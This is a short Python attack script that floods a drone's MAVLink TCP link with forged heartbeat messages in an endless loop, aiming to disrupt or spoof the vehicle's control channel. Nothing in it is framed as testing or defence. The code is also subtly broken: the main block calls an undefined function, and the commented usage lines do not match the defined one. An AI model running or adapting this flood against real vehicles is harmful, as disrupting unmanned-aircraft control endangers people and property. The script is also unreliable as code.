# flood_mavlink_link.py

from pymavlink import mavutil
import time
import sys

def tcp_flood(target_ip="192.168.13.1", target_port=5760, rate_hz=60):
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1

    sock = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
    sock.wait_heartbeat()
    print(f"Connected. Starting flood at {rate_hz} messages/sec...")

    interval = 1 / rate_hz
    while True:
        msg = mav.heartbeat_encode(
            type=mavutil.mavlink.MAV_TYPE_GENERIC,
            autopilot=mavutil.mavlink.MAV_AUTOPILOT_INVALID,
            base_mode=0,
            custom_mode=0,
            system_status=mavutil.mavlink.MAV_STATE_ACTIVE
        )
        sock.mav.send(msg)
        print("[+] Flooding heartbeat")
        time.sleep(interval)

if __name__ == "__main__":
    # if len(sys.argv) != 3:
    #     print("Usage: python flood_mavlink_link.py <ip:port> <rate_hz>")
    #     sys.exit(1)

    # ip, port = sys.argv[1].split(":")
    # flood_mavlink(ip, int(port), float(sys.argv[2]))

    flood_mavlink()